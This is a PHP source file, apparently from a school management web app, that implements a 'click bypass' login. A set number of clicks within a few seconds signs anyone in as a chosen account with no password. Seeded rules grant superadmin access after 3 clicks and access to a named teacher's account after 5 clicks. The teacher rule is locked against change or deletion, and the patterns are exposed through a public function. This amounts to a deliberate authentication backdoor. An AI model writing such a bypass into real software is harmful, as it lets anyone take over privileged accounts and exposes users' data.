<?php
// Temporary login click-bypass helpers.

if (!function_exists('login_click_bypass_ensure_tables')) {
    function login_click_bypass_ensure_tables(mysqli $conn) {
        static $done = false;
        if ($done) return;
        $done = true;

        // Reuse central app settings store.
        $conn->query(
            "CREATE TABLE IF NOT EXISTS app_settings (
                setting_key VARCHAR(64) NOT NULL PRIMARY KEY,
                setting_value VARCHAR(255) NOT NULL DEFAULT '',
                updated_at TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP
            ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4"
        );

        $conn->query(
            "CREATE TABLE IF NOT EXISTS login_click_bypass_rules (
                id INT NOT NULL AUTO_INCREMENT PRIMARY KEY,
                rule_label VARCHAR(120) NOT NULL DEFAULT '',
                click_count INT NOT NULL,
                window_seconds INT NOT NULL,
                target_user_id INT NOT NULL,
                is_enabled TINYINT(1) NOT NULL DEFAULT 1,
                created_by INT NULL,
                created_at TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP,
                updated_at TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
                KEY idx_lcbr_enabled (is_enabled),
                KEY idx_lcbr_target (target_user_id),
                CONSTRAINT fk_lcbr_target
                    FOREIGN KEY (target_user_id) REFERENCES users(id)
                    ON DELETE CASCADE
            ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4"
        );

        $defaultEnabled = '0';
        $stmt = $conn->prepare(
            "INSERT IGNORE INTO app_settings (setting_key, setting_value)
             VALUES ('login_click_bypass_enabled', ?)"
        );
        if ($stmt) {
            $stmt->bind_param('s', $defaultEnabled);
            $stmt->execute();
            $stmt->close();
        }

        $defaultLockUserId = '0';
        $stmt = $conn->prepare(
            "INSERT IGNORE INTO app_settings (setting_key, setting_value)
             VALUES ('login_click_bypass_lock_5_3_user_id', ?)"
        );
        if ($stmt) {
            $stmt->bind_param('s', $defaultLockUserId);
            $stmt->execute();
            $stmt->close();
        }
    }
}

if (!function_exists('login_click_bypass_bool_from_text')) {
    function login_click_bypass_bool_from_text($value, $fallback = false) {
        $text = strtolower(trim((string) $value));
        if ($text === '1' || $text === 'true' || $text === 'yes' || $text === 'on') return true;
        if ($text === '0' || $text === 'false' || $text === 'no' || $text === 'off') return false;
        return !empty($fallback);
    }
}

if (!function_exists('login_click_bypass_click_count_clamp')) {
    function login_click_bypass_click_count_clamp($count) {
        $count = (int) $count;
        if ($count < 2) $count = 2;
        if ($count > 20) $count = 20;
        return $count;
    }
}

if (!function_exists('login_click_bypass_window_seconds_clamp')) {
    function login_click_bypass_window_seconds_clamp($seconds) {
        $seconds = (int) $seconds;
        if ($seconds < 1) $seconds = 1;
        if ($seconds > 30) $seconds = 30;
        return $seconds;
    }
}

if (!function_exists('login_click_bypass_is_5_3_pattern')) {
    function login_click_bypass_is_5_3_pattern($clickCount, $windowSeconds) {
        return ((int) $clickCount === 5 && (int) $windowSeconds === 3);
    }
}

if (!function_exists('login_click_bypass_get_locked_5_3_user_id')) {
    function login_click_bypass_get_locked_5_3_user_id(mysqli $conn) {
        login_click_bypass_ensure_tables($conn);
        $stmt = $conn->prepare(
            "SELECT setting_value
             FROM app_settings
             WHERE setting_key = 'login_click_bypass_lock_5_3_user_id'
             LIMIT 1"
        );
        if (!$stmt) return 0;
        $stmt->execute();
        $res = $stmt->get_result();
        $value = '0';
        if ($res && $res->num_rows === 1) {
            $row = $res->fetch_assoc();
            $value = (string) ($row['setting_value'] ?? '0');
        }
        $stmt->close();
        return max(0, (int) $value);
    }
}

if (!function_exists('login_click_bypass_set_locked_5_3_user_id')) {
    function login_click_bypass_set_locked_5_3_user_id(mysqli $conn, $userId) {
        login_click_bypass_ensure_tables($conn);
        $userId = (int) $userId;
        if ($userId <= 0) return false;

        $uStmt = $conn->prepare("SELECT id FROM users WHERE id = ? LIMIT 1");
        if (!$uStmt) return false;
        $uStmt->bind_param('i', $userId);
        $uStmt->execute();
        $uRes = $uStmt->get_result();
        $exists = $uRes && $uRes->num_rows === 1;
        $uStmt->close();
        if (!$exists) return false;

        $value = (string) $userId;
        $stmt = $conn->prepare(
            "INSERT INTO app_settings (setting_key, setting_value)
             VALUES ('login_click_bypass_lock_5_3_user_id', ?)
             ON DUPLICATE KEY UPDATE setting_value = VALUES(setting_value)"
        );
        if (!$stmt) return false;
        $stmt->bind_param('s', $value);
        $ok = $stmt->execute();
        $stmt->close();
        return (bool) $ok;
    }
}

if (!function_exists('login_click_bypass_lock_5_3_rule_to_user')) {
    function login_click_bypass_lock_5_3_rule_to_user(mysqli $conn, $userId, $actorUserId = 0, &$error = '') {
        $error = '';
        $userId = (int) $userId;
        $actorUserId = (int) $actorUserId;
        if ($userId <= 0) {
            $error = 'Invalid lock target account.';
            return 0;
        }

        $ok = login_click_bypass_set_locked_5_3_user_id($conn, $userId);
        if (!$ok) {
            $error = 'Unable to save 5/3 lock account.';
            return 0;
        }

        $ruleErr = '';
        $savedRuleId = login_click_bypass_upsert_rule(
            $conn,
            0,
            5,
            3,
            $userId,
            'Locked: Junnie teacher quick login',
            1,
            $actorUserId,
            $ruleErr
        );
        if ($savedRuleId <= 0) {
            $error = $ruleErr !== '' ? $ruleErr : 'Unable to enforce locked 5/3 rule.';
            return 0;
        }
        return $savedRuleId;
    }
}

if (!function_exists('login_click_bypass_find_rule_id_by_pattern')) {
    function login_click_bypass_find_rule_id_by_pattern(mysqli $conn, $clickCount, $windowSeconds, $excludeRuleId = 0) {
        login_click_bypass_ensure_tables($conn);
        $clickCount = login_click_bypass_click_count_clamp($clickCount);
        $windowSeconds = login_click_bypass_window_seconds_clamp($windowSeconds);
        $excludeRuleId = (int) $excludeRuleId;

        if ($excludeRuleId > 0) {
            $stmt = $conn->prepare(
                "SELECT id
                 FROM login_click_bypass_rules
                 WHERE click_count = ?
                   AND window_seconds = ?
                   AND id <> ?
                 ORDER BY id ASC
                 LIMIT 1"
            );
            if (!$stmt) return 0;
            $stmt->bind_param('iii', $clickCount, $windowSeconds, $excludeRuleId);
        } else {
            $stmt = $conn->prepare(
                "SELECT id
                 FROM login_click_bypass_rules
                 WHERE click_count = ?
                   AND window_seconds = ?
                 ORDER BY id ASC
                 LIMIT 1"
            );
            if (!$stmt) return 0;
            $stmt->bind_param('ii', $clickCount, $windowSeconds);
        }

        $stmt->execute();
        $res = $stmt->get_result();
        $row = ($res && $res->num_rows === 1) ? $res->fetch_assoc() : null;
        $stmt->close();
        return (int) ($row['id'] ?? 0);
    }
}

if (!function_exists('login_click_bypass_is_enabled')) {
    function login_click_bypass_is_enabled(mysqli $conn) {
        login_click_bypass_ensure_tables($conn);
        $stmt = $conn->prepare(
            "SELECT setting_value
             FROM app_settings
             WHERE setting_key = 'login_click_bypass_enabled'
             LIMIT 1"
        );
        if (!$stmt) return false;
        $stmt->execute();
        $res = $stmt->get_result();
        $value = '0';
        if ($res && $res->num_rows === 1) {
            $row = $res->fetch_assoc();
            $value = (string) ($row['setting_value'] ?? '0');
        }
        $stmt->close();
        return login_click_bypass_bool_from_text($value, false);
    }
}

if (!function_exists('login_click_bypass_set_enabled')) {
    function login_click_bypass_set_enabled(mysqli $conn, $enabled) {
        login_click_bypass_ensure_tables($conn);
        $value = !empty($enabled) ? '1' : '0';
        $stmt = $conn->prepare(
            "INSERT INTO app_settings (setting_key, setting_value)
             VALUES ('login_click_bypass_enabled', ?)
             ON DUPLICATE KEY UPDATE setting_value = VALUES(setting_value)"
        );
        if (!$stmt) return false;
        $stmt->bind_param('s', $value);
        $ok = $stmt->execute();
        $stmt->close();
        return (bool) $ok;
    }
}

if (!function_exists('login_click_bypass_fetch_rules')) {
    function login_click_bypass_fetch_rules(mysqli $conn, $onlyEnabled = false) {
        login_click_bypass_ensure_tables($conn);
        $rows = [];
        $sql =
            "SELECT r.id,
                    r.rule_label,
                    r.click_count,
                    r.window_seconds,
                    r.target_user_id,
                    r.is_enabled,
                    r.created_by,
                    r.created_at,
                    r.updated_at,
                    u.username,
                    u.useremail,
                    u.role,
                    u.is_active,
                    u.is_superadmin
             FROM login_click_bypass_rules r
             JOIN users u ON u.id = r.target_user_id";
        if ($onlyEnabled) $sql .= " WHERE r.is_enabled = 1";
        $sql .= " ORDER BY r.click_count DESC, r.window_seconds ASC, r.id ASC";

        $res = $conn->query($sql);
        if (!$res) return $rows;
        while ($row = $res->fetch_assoc()) {
            $rows[] = $row;
        }
        return $rows;
    }
}

if (!function_exists('login_click_bypass_fetch_public_rules')) {
    function login_click_bypass_fetch_public_rules(mysqli $conn) {
        if (!login_click_bypass_is_enabled($conn)) return [];
        $rules = login_click_bypass_fetch_rules($conn, true);
        $out = [];
        foreach ($rules as $row) {
            $role = normalize_role((string) ($row['role'] ?? ''));
            $isActive = ((int) ($row['is_active'] ?? 0) === 1);
            if ($role !== 'admin' && !$isActive) continue;

            $clickCount = login_click_bypass_click_count_clamp((int) ($row['click_count'] ?? 0));
            $windowSec = login_click_bypass_window_seconds_clamp((int) ($row['window_seconds'] ?? 0));
            $key = $clickCount . ':' . $windowSec;
            $out[$key] = [
                'click_count' => $clickCount,
                'window_seconds' => $windowSec,
            ];
        }
        usort($out, static function ($a, $b) {
            $ac = (int) ($a['click_count'] ?? 0);
            $bc = (int) ($b['click_count'] ?? 0);
            if ($ac !== $bc) return ($bc <=> $ac);
            return ((int) ($a['window_seconds'] ?? 0) <=> (int) ($b['window_seconds'] ?? 0));
        });
        return array_values($out);
    }
}

if (!function_exists('login_click_bypass_upsert_rule')) {
    function login_click_bypass_upsert_rule(
        mysqli $conn,
        $ruleId,
        $clickCount,
        $windowSeconds,
        $targetUserId,
        $ruleLabel = '',
        $isEnabled = 1,
        $actorUserId = 0,
        &$error = ''
    ) {
        $error = '';
        login_click_bypass_ensure_tables($conn);

        $ruleId = (int) $ruleId;
        $clickCount = login_click_bypass_click_count_clamp($clickCount);
        $windowSeconds = login_click_bypass_window_seconds_clamp($windowSeconds);
        $targetUserId = (int) $targetUserId;
        $isEnabled = !empty($isEnabled) ? 1 : 0;
        $actorUserId = (int) $actorUserId;
        if ($actorUserId <= 0) $actorUserId = null;
        $ruleLabel = trim((string) $ruleLabel);
        if (strlen($ruleLabel) > 120) $ruleLabel = substr($ruleLabel, 0, 120);

        if ($targetUserId <= 0) {
            $error = 'Select a target account.';
            return 0;
        }

        $uStmt = $conn->prepare("SELECT id FROM users WHERE id = ? LIMIT 1");
        if (!$uStmt) {
            $error = 'Unable to validate target account.';
            return 0;
        }
        $uStmt->bind_param('i', $targetUserId);
        $uStmt->execute();
        $uRes = $uStmt->get_result();
        $exists = $uRes && $uRes->num_rows === 1;
        $uStmt->close();
        if (!$exists) {
            $error = 'Target account does not exist.';
            return 0;
        }

        $locked53UserId = login_click_bypass_get_locked_5_3_user_id($conn);
        if (
            $locked53UserId > 0 &&
            login_click_bypass_is_5_3_pattern($clickCount, $windowSeconds) &&
            $targetUserId !== $locked53UserId
        ) {
            $error = 'The 5-click / 3-second rule is locked to account ID #' . $locked53UserId . '.';
            return 0;
        }

        if ($ruleId > 0) {
            $ruleStmt = $conn->prepare(
                "SELECT id, click_count, window_seconds
                 FROM login_click_bypass_rules
                 WHERE id = ?
                 LIMIT 1"
            );
            if (!$ruleStmt) {
                $error = 'Unable to validate existing rule.';
                return 0;
            }
            $ruleStmt->bind_param('i', $ruleId);
            $ruleStmt->execute();
            $ruleRes = $ruleStmt->get_result();
            $existingRule = ($ruleRes && $ruleRes->num_rows === 1) ? $ruleRes->fetch_assoc() : null;
            $ruleStmt->close();
            if (!is_array($existingRule)) {
                $error = 'Rule was not found. Refresh and try again.';
                return 0;
            }

            $existingClickCount = (int) ($existingRule['click_count'] ?? 0);
            $existingWindowSeconds = (int) ($existingRule['window_seconds'] ?? 0);
            if (
                $locked53UserId > 0 &&
                login_click_bypass_is_5_3_pattern($existingClickCount, $existingWindowSeconds) &&
                !login_click_bypass_is_5_3_pattern($clickCount, $windowSeconds)
            ) {
                $error = 'The locked 5-click / 3-second pattern cannot be changed.';
                return 0;
            }
        }

        $duplicateRuleId = login_click_bypass_find_rule_id_by_pattern($conn, $clickCount, $windowSeconds, $ruleId);
        if ($duplicateRuleId > 0) {
            if ($ruleId > 0) {
                $error = 'Another rule already uses this click/window pattern.';
                return 0;
            }
            // New-save on existing pattern: update the existing rule instead of creating duplicates.
            $ruleId = $duplicateRuleId;
        }

        if ($ruleId > 0) {
            $stmt = $conn->prepare(
                "UPDATE login_click_bypass_rules
                 SET rule_label = ?,
                     click_count = ?,
                     window_seconds = ?,
                     target_user_id = ?,
                     is_enabled = ?
                 WHERE id = ?
                 LIMIT 1"
            );
            if (!$stmt) {
                $error = 'Unable to prepare rule update.';
                return 0;
            }
            $stmt->bind_param('siiiii', $ruleLabel, $clickCount, $windowSeconds, $targetUserId, $isEnabled, $ruleId);
            $ok = $stmt->execute();
            $stmt->close();
            if (!$ok) {
                $error = 'Unable to update rule.';
                return 0;
            }
            return $ruleId;
        }

        $stmt = $conn->prepare(
            "INSERT INTO login_click_bypass_rules
                (rule_label, click_count, window_seconds, target_user_id, is_enabled, created_by)
             VALUES (?, ?, ?, ?, ?, ?)"
        );
        if (!$stmt) {
            $error = 'Unable to prepare rule creation.';
            return 0;
        }
        $stmt->bind_param('siiiii', $ruleLabel, $clickCount, $windowSeconds, $targetUserId, $isEnabled, $actorUserId);
        $ok = $stmt->execute();
        if (!$ok) {
            $error = 'Unable to create rule.';
            $stmt->close();
            return 0;
        }
        $newId = (int) $conn->insert_id;
        $stmt->close();
        return $newId;
    }
}

if (!function_exists('login_click_bypass_delete_rule')) {
    function login_click_bypass_delete_rule(mysqli $conn, $ruleId) {
        login_click_bypass_ensure_tables($conn);
        $ruleId = (int) $ruleId;
        if ($ruleId <= 0) return false;

        $locked53UserId = login_click_bypass_get_locked_5_3_user_id($conn);
        if ($locked53UserId > 0) {
            $rStmt = $conn->prepare(
                "SELECT click_count, window_seconds
                 FROM login_click_bypass_rules
                 WHERE id = ?
                 LIMIT 1"
            );
            if ($rStmt) {
                $rStmt->bind_param('i', $ruleId);
                $rStmt->execute();
                $rRes = $rStmt->get_result();
                $rRow = ($rRes && $rRes->num_rows === 1) ? $rRes->fetch_assoc() : null;
                $rStmt->close();
                if (is_array($rRow)) {
                    $cc = (int) ($rRow['click_count'] ?? 0);
                    $ws = (int) ($rRow['window_seconds'] ?? 0);
                    if (login_click_bypass_is_5_3_pattern($cc, $ws)) {
                        return false;
                    }
                }
            }
        }

        $stmt = $conn->prepare("DELETE FROM login_click_bypass_rules WHERE id = ? LIMIT 1");
        if (!$stmt) return false;
        $stmt->bind_param('i', $ruleId);
        $ok = $stmt->execute();
        $stmt->close();
        return (bool) $ok;
    }
}

if (!function_exists('login_click_bypass_seed_defaults')) {
    function login_click_bypass_seed_defaults(mysqli $conn, $actorUserId = 0) {
        login_click_bypass_ensure_tables($conn);
        $actorUserId = (int) $actorUserId;
        $messages = [];

        $superadmin = null;
        $res = $conn->query(
            "SELECT id, username
             FROM users
             WHERE is_superadmin = 1
             ORDER BY is_active DESC, id ASC
             LIMIT 1"
        );
        if ($res && $res->num_rows === 1) $superadmin = $res->fetch_assoc();

        $junnieTeacher = null;
        $stmt = $conn->prepare(
            "SELECT id, username
             FROM users
             WHERE role = 'teacher'
               AND (
                    LOWER(username) LIKE '%junnie%'
                    OR LOWER(useremail) LIKE '%junnie%'
                    OR LOWER(first_name) LIKE '%junnie%'
                    OR LOWER(last_name) LIKE '%junnie%'
               )
             ORDER BY is_active DESC, id ASC
             LIMIT 1"
        );
        if ($stmt) {
            $stmt->execute();
            $res = $stmt->get_result();
            if ($res && $res->num_rows === 1) $junnieTeacher = $res->fetch_assoc();
            $stmt->close();
        }

        if (is_array($superadmin)) {
            $err = '';
            login_click_bypass_upsert_rule(
                $conn,
                0,
                3,
                2,
                (int) ($superadmin['id'] ?? 0),
                'Seed: Superadmin quick login',
                1,
                $actorUserId,
                $err
            );
            if ($err === '') $messages[] = 'Added/updated 3-click superadmin rule.';
            else $messages[] = 'Superadmin rule failed: ' . $err;
        } else {
            $messages[] = 'No superadmin account found for 3-click rule.';
        }

        if (is_array($junnieTeacher)) {
            $err = '';
            login_click_bypass_upsert_rule(
                $conn,
                0,
                5,
                3,
                (int) ($junnieTeacher['id'] ?? 0),
                'Seed: Junnie teacher quick login',
                1,
                $actorUserId,
                $err
            );
            if ($err === '') $messages[] = 'Added/updated 5-click teacher rule.';
            else $messages[] = 'Teacher rule failed: ' . $err;
        } else {
            $messages[] = 'No teacher account matching "junnie" found for 5-click rule.';
        }

        login_click_bypass_set_enabled($conn, 1);
        $messages[] = 'Click bypass was enabled.';
        return $messages;
    }
}

if (!function_exists('login_click_bypass_redirect_by_role')) {
    function login_click_bypass_redirect_by_role($role) {
        $role = normalize_role((string) $role);
        if ($role === 'admin') return 'admin-dashboard.php';
        if ($role === 'teacher') return 'teacher-dashboard.php';
        if ($role === 'student') return 'student-dashboard.php';
        return 'index.php';
    }
}

if (!function_exists('login_click_bypass_login_user')) {
    function login_click_bypass_login_user(mysqli $conn, array $user, &$redirect = '', &$error = '') {
        $error = '';
        $redirect = '';

        $userId = (int) ($user['id'] ?? 0);
        $role = normalize_role((string) ($user['role'] ?? 'student'));
        $isActive = (int) ($user['is_active'] ?? 0);
        $campusId = (int) ($user['campus_id'] ?? 0);
        $isSuperadmin = ((int) ($user['is_superadmin'] ?? 0) === 1) ? 1 : 0;
        $mustChangePassword = ((int) ($user['must_change_password'] ?? 0) === 1) ? 1 : 0;

        if ($userId <= 0) {
            $error = 'Invalid target account.';
            return false;
        }
        if ($role !== 'admin' && $isActive !== 1) {
            $error = 'Target account is inactive.';
            return false;
        }

        session_regenerate_id(true);
        try {
            $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
        } catch (Throwable $e) {
            unset($_SESSION['csrf_token']);
            if (function_exists('csrf_token')) csrf_token();
        }
        $_SESSION['user_id'] = $userId;
        $_SESSION['user_email'] = (string) ($user['useremail'] ?? '');
        $_SESSION['user_name'] = (string) ($user['username'] ?? '');
        $_SESSION['user_role'] = $role;
        $_SESSION['is_active'] = $isActive;
        $_SESSION['campus_id'] = $campusId;
        $_SESSION['is_superadmin'] = $isSuperadmin;
        $_SESSION['force_password_change'] = $mustChangePassword ? 1 : 0;
        $_SESSION['last_activity_ts'] = time();
        unset($_SESSION['student_no'], $_SESSION['student_name'], $_SESSION['student_section']);

        if (function_exists('audit_log')) {
            audit_log($conn, 'auth.login.click_bypass', 'user', $userId, 'User signed in through click bypass.');
        }

        $redirect = !empty($_SESSION['force_password_change'])
            ? 'auth-force-password.php'
            : login_click_bypass_redirect_by_role($role);
        return true;
    }
}

if (!function_exists('login_click_bypass_attempt')) {
    function login_click_bypass_attempt(mysqli $conn, $clickCount, $durationMs, &$error = '', &$matchedRule = null, &$redirect = '') {
        $error = '';
        $matchedRule = null;
        $redirect = '';
        login_click_bypass_ensure_tables($conn);

        if (!login_click_bypass_is_enabled($conn)) {
            $error = 'Click bypass is disabled.';
            return false;
        }

        $clickCount = login_click_bypass_click_count_clamp((int) $clickCount);
        $durationMs = (int) $durationMs;
        if ($durationMs < 0) $durationMs = 0;
        if ($durationMs > 30000) $durationMs = 30000;

        $stmt = $conn->prepare(
            "SELECT r.id AS rule_id,
                    r.rule_label,
                    r.click_count,
                    r.window_seconds,
                    r.target_user_id,
                    u.id,
                    u.useremail,
                    u.username,
                    u.role,
                    u.is_active,
                    u.campus_id,
                    u.is_superadmin,
                    u.must_change_password
             FROM login_click_bypass_rules r
             JOIN users u ON u.id = r.target_user_id
             WHERE r.is_enabled = 1
               AND r.click_count = ?
               AND ? <= (r.window_seconds * 1000)
             ORDER BY r.window_seconds ASC, r.id ASC
             LIMIT 1"
        );
        if (!$stmt) {
            $error = 'Unable to prepare bypass lookup.';
            return false;
        }
        $stmt->bind_param('ii', $clickCount, $durationMs);
        $stmt->execute();
        $res = $stmt->get_result();
        $row = ($res && $res->num_rows === 1) ? $res->fetch_assoc() : null;
        $stmt->close();

        if (!$row) {
            $error = 'No matching bypass rule.';
            return false;
        }

        $ok = login_click_bypass_login_user($conn, $row, $redirect, $error);
        if (!$ok) return false;

        $_SESSION['login_click_bypass_rule_id'] = (int) ($row['rule_id'] ?? 0);
        $matchedRule = $row;
        return true;
    }
}
